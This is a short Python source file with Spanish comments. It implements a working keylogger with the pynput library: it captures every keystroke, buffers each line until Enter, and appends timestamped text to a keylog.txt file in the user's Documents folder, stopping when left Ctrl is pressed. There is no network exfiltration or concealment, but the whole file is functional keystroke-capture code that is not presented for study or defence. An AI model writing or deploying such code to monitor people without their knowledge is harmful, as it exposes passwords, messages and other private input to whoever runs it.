from pynput.keyboard import Key, Listener
import os
from datetime import datetime

# Obtener la ruta de la carpeta Documentos del usuario actual
documents_path = os.path.join(os.path.expanduser('~'), 'Documents', 'keylog.txt')

# Inicializar un buffer para almacenar las teclas
key_buffer = []

# Función que registra cada tecla pulsada
def on_press(key):
    global key_buffer
    if key == Key.enter:
        # Obtener la hora actual
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        # Al presionar Enter, guardar el buffer con una marca de tiempo
        with open(documents_path, "a") as f:
            f.write(f"[{current_time}] " + ''.join(key_buffer) + '\n')
        key_buffer = []  # Vaciar el buffer después de guardar el contenido
    elif key == Key.space:
        key_buffer.append(' ')  # Agregar un espacio al buffer
    elif key == Key.backspace:
        if key_buffer:
            key_buffer.pop()  # Eliminar el último carácter si se presiona 'Borrar'
    elif hasattr(key, 'char') and key.char is not None:
        key_buffer.append(key.char)  # Agregar caracteres al buffer
    elif key == Key.ctrl_l:
        # Obtener la hora actual antes de detener el programa
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        # Si el buffer tiene contenido, guardarlo antes de detener el listener
        if key_buffer:
            with open(documents_path, "a") as f:
                f.write(f"[{current_time}] " + ''.join(key_buffer) + '\n')
        return False  # Detener el listener cuando se presiona 'Ctrl + L'

# Función para iniciar la captura de teclas
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
